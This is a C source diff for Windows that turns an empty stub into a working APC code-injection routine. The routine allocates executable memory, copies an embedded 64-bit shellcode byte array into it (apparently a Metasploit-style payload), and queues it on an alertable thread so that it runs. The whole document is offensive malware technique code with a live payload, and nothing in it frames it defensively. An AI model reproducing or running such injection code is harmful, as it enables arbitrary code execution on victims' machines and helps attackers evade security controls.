@@ -1,16 +1,7 @@
 #include <windows.h> 
 #include <stdio.h>
 
-/*
-Pas encore implémenté, passez votre chemin...
-
-*/
-void APCinjection(){
-
-}
-
-int main(void) { 
-    const UCHAR shellcode_64[] = 
+const UCHAR shellcode_64[] = 
         "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
         "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
         "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
@@ -36,5 +27,25 @@ int main(void) {
         "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
         "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 
-        
+void alertableThread() {
+
+    SleepEx(-1, TRUE);
+}
+
+void APCinjection(){
+    LPVOID pShellcode = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(pShellcode, shellcode_64, sizeof(shellcode_64));
+
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alertableThread, NULL, 0, NULL);
+
+    QueueUserAPC((PAPCFUNC)pShellcode, hThread, 0);
+
+    getchar();
+}
+
+int main(void) {
+
+    APCinjection();
+
+    return 0;       
 }
